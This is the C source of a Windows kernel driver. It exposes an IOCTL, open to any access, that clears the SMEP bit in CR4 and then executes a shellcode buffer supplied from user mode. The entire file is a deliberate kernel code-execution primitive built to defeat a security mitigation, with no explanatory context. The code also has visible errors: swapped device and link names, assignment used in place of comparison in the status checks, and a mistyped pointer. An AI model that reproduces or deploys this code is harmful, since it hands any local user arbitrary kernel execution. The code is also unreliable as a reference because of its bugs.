#include <wdm.h>

#define EXEC_SHELLCODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1337, METHOD_BUFFERED, FILE_ANY_ACCESS)

UNICODE_STRING SYM_NAME = RTL_CONSTANT_STRING(L"\\Device\\ExecShellcode");
UNICODE_STRING DEV_NAME = RTL_CONSTANT_STRING(L"\\??\\ExecShellcode");
DRIVER_DISPATCH DispatchDeviceControl;

typedef PVOID(NTAPI* MmGetSystemRoutineAddressAddr)(PUNICODE_STRING SystemRoutineName);
typedef void(__stdcall * user_shellcode_ptr)(MmGetSystemRoutineAddressAddr);

typedef struct _SHELLCODE_BUFFER
{
    void* UserProvidedShellcode;
};

VOID ExecuteUserProvidedShellcode(PVOID UserProvidedShellcode)
{

    unsigned __int64 old_cr4;
    unsigned __int64 *old_cr4_ptr;
    unsigned __int64 disable_smep_result;

    old_cr4 = __readcr4();

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "SMEP Enabled CR4: 0x%x", old_cr4);

    old_cr4_ptr = old_cr4;
    disable_smep_result = old_cr4 & 0xFFFFFFFFFFEFFFFF;
    
    __writecr4(disable_smep_result);

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "SMEP Disabled CR4: 0x%x", old_cr4);

    user_shellcode_ptr shellcode = (user_shellcode_ptr)UserProvidedShellcode;
    MmGetSystemRoutineAddressAddr exec = MmGetSystemRoutineAddress;

    shellcode(exec);

    __writecr4(old_cr4);

}

VOID DriverUnload(PDRIVER_OBJECT DriverObject)
{
    IoDeleteDevice(DriverObject->DeviceObject);
    IoDeleteSymbolicLink(&SYM_NAME);
}

NTSTATUS DispatchDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{

    PIO_STACK_LOCATION stack_location = NULL;
    NTSTATUS status = STATUS_SUCCESS;
    
    stack_location = IoGetCurrentIrpStackLocation(Irp);

    switch (stack_location->MajorFunction)
    {
    case IRP_MJ_DEVICE_CONTROL:

        if (stack_location->Parameters.DeviceIoControl.IoControlCode == EXEC_SHELLCODE)
        {
            PVOID UserProvidedShellcode = Irp->AssociatedIrp.SystemBuffer;

            ExecuteUserProvidedShellcode(UserProvidedShellcode);

        }   
    }

    Irp->IoStatus.Information = 0;
    Irp->IoStatus.Status = STATUS_SUCCESS;

    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return status;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    NTSTATUS status = 0;

    UNREFERENCED_PARAMETER(RegistryPath);

    status = IoCreateDevice(DriverObject, 0, &DEV_NAME, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &DriverObject->DeviceObject);
    if (status = STATUS_SUCCESS)
    {
        status = IoCreateSymbolicLink(&SYM_NAME, &DEV_NAME);
        if (status = STATUS_SUCCESS)
        {
            DriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchDeviceControl;
            DriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchDeviceControl;
            DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;
            DriverObject->DriverUnload = DriverUnload;

            status = STATUS_SUCCESS;
        }

        else {
            IoDeleteDevice(DriverObject);
        }
    }
    
    return status;
}
